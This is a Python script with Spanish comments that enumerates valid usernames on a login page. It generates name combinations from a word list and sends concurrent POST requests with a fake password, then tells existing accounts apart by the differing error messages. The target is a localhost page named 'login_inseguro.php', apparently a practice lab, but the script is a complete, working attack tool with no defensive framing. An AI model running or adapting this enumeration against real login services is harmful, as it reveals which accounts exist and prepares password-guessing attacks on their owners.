import aiohttp
import asyncio
import itertools

# Configuración
URL = "http://localhost:8080/login_inseguro.php"
PASSWORD_FAKE = "abc"
MAX_CONCURRENT_REQUESTS = 30
DICTIONARY_PATH = "userlist_generated.txt"

# Cargar archivo base de nombres y apellidos
def load_base_words(path):
    with open(path, "r", encoding="utf-8") as f:
        return sorted(set(w.strip().lower() for w in f if w.strip()))

# Generar combinaciones de usuario: individuales y de a dos
def generate_usernames(base_words):
    usernames = set()

    for word in base_words:
        usernames.add(word)

    for a, b in itertools.product(base_words, repeat=2):
        if a != b:
            usernames.update([
                f"{a}{b}",
                #f"{a}.{b}",
                #f"{a}_{b}",
                #f"{b}{a}",
                #f"{b}.{a}",
                #f"{b}_{a}",
                #f"{a[0]}.{b}",
                #f"{b[0]}.{a}"
            ])

    return sorted(usernames)

# Petición asincrónica
async def check_username(session, semaphore, username, found):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": username, "password": PASSWORD_FAKE}) as resp:
                text = await resp.text()
                if "Usuario no encontrado" in text:
                    print(f"[-] No existe: {username}")
                elif "Contraseña incorrecta" in text:
                    print(f"[✓] Usuario válido encontrado (contraseña incorrecta): {username}")
                    found.append(username)
                else:
                    # Otras respuestas (quizás OK, o error no esperado)
                    print(f"[?] Respuesta inesperada para {username}: {text}")
        except Exception as e:
            print(f"[!] Error con {username}: {e}")

# Programa principal
async def main():
    base_words = load_base_words(DICTIONARY_PATH)
    usernames = generate_usernames(base_words)
    print(f"🔎 Probando {len(usernames)} posibles nombres de usuario...")

    found = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession() as session:
        tasks = [check_username(session, semaphore, u, found) for u in usernames]
        await asyncio.gather(*tasks)

    print("\n✅ Usuarios válidos encontrados:")
    for u in found:
        print(f" - {u}")

# Lanzar script
if __name__ == "__main__":
    asyncio.run(main())
